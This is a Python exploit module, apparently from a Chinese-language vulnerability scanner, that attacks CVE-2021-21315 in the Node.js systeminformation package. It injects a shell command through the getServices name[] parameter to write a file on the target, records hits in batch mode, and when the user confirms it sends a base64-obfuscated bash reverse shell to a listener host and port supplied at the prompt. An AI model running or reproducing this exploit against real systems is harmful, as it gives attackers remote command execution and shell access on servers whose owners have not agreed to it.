#! /usr/bin/python3
# -*- coding: utf-8 -*-
import requests
import urllib3
from urllib.request import quote
import base64
from pub.com.outprint import OutPrintInfo,OutPrintInfoSuc
from pub.com.reqset import ReqSet
from rich.prompt import Prompt
urllib3.disable_warnings()
class Cve_2021_21315:
    def __init__(self):
        self.headers = None
        self.proxy = None
        self.verify = None

    def poc1(self,url):
        new_url = url + "/api/getServices?name[]=$(echo -e 'hasdazz' > csvuls.txt)"
        try:
            response = requests.get(url=new_url, headers=self.headers, verify=self.verify, proxies=self.proxy)
            response.encoding = response.apparent_encoding
            if response.status_code == 200:
                OutPrintInfoSuc("Node-JS", f'可能存在Node.js漏洞:{new_url}')
                if self.batch:
                    with open("./result/nodejs_2021_21315.txt","a") as w:
                        w.write(f"{new_url}\n")
                return True
            else:
                if not self.batch:
                    OutPrintInfo("Node-JS", "目标不存在Node.js CVE-2021-21315漏洞")
                return False
        except Exception as e:
            if not self.batch:
                OutPrintInfo("Node-JS", "目标请求出错")
            return False

    def payload_wrapper(self, lhost, lport, url):
        Payload = f"bash -i >& /dev/tcp/{lhost}/{lport} 0>&1"
        Payload = base64.b64encode(Payload.encode()).decode()
        Payload = quote(f"$(echo '{Payload}' | base64 -d | bash)")

        url = url + f'[]={Payload}'
        return url

    def poc2(self, url):
        OutPrintInfo("Node-JS", "Sending Payload ...")
        try:
            req = requests.get(url, timeout=3,headers=self.headers,proxies=self.proxy,verify=self.verify)
        except:
            # TODO: Write a better exception Handler

            OutPrintInfo("Node-JS","Check your listener")
            return
    def main(self, target):
        self.batch = target["batch_work"]
        url = target["url"].strip('/ ')
        headers = target["header"]
        self.verify = target["ssl"]
        proxy = target["proxy"]
        self.headers, self.proxy = ReqSet(header=headers, proxy=proxy, bwork=self.batch)
        if not self.batch:
            OutPrintInfo("Node-JS", '开始检测Node.js CVE-2021-21315漏洞......')
        if self.poc1(url):
            if not self.batch:
                choose = Prompt.ask("是否执行端口转发[b red](y/n)[/b red]")
                if choose == 'y':
                    lhost = Prompt.ask("[b red]LHost[/b red]")
                    lport = Prompt.ask("[b red]LPort[/b red]")
                    self.poc2(self.payload_wrapper(lhost, lport, url))
        else:
            if not self.batch:
                OutPrintInfo("Node-JS", f'目标{url}不存在漏洞')
        if not self.batch:
            OutPrintInfo("Node-JS", "Node.js CVE-2021-21315检测结束")
